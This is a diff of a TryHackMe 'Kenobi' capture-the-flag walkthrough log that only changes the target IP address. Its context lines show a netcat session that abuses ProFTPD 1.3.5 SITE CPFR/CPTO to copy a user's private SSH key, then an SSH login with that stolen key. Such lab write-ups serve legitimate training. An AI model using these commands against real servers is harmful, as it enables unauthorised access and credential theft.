@@ -140,8 +140,8 @@ root@kali:~# cd tryhackme/kenobi/
 
 TRANSFER SSH ID_RSA KEY FILE
 
-root@kali:~/tryhackme/kenobi# nc 10.10.156.142 21
-220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.156.142]
+root@kali:~/tryhackme/kenobi# nc 10.10.252.52 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.252.52]
 SITE CPFR /home/kenobi/.ssh/id_rsa    
 350 File or directory exists, ready for destination name
 SITE CPTO /var/tmp/id_rsa
@@ -200,11 +200,11 @@ drwx------  3 root root 4096 Oct 17 16:16 systemd-private-83c07c0caa97434e8d7d91
 LOGIN VIA KENOBI SSH KEY
 
 root@kali:/var/tmp# chmod 600 id_rsa 
-root@kali:/var/tmp# ssh -i id_rsa kenobi@10.10.156.142
-The authenticity of host '10.10.156.142 (10.10.156.142)' can't be established.
+root@kali:/var/tmp# ssh -i id_rsa kenobi@10.10.252.52
+The authenticity of host '10.10.252.52 (10.10.252.52)' can't be established.
 ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
 Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '10.10.156.142' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.10.252.52' (ECDSA) to the list of known hosts.
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -266,7 +266,7 @@ kenobi@kenobi:~$ uname -r
 4.8.0-58-generic
 kenobi@kenobi:~$ ifconfig
 eth0      Link encap:Ethernet  HWaddr 02:76:47:d5:0d:db  
-          inet addr:10.10.156.142  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet addr:10.10.252.52  Bcast:10.10.255.255  Mask:255.255.0.0
           inet6 addr: fe80::76:47ff:fed5:ddb/64 Scope:Link
           UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
           RX packets:490 errors:0 dropped:0 overruns:0 frame:0
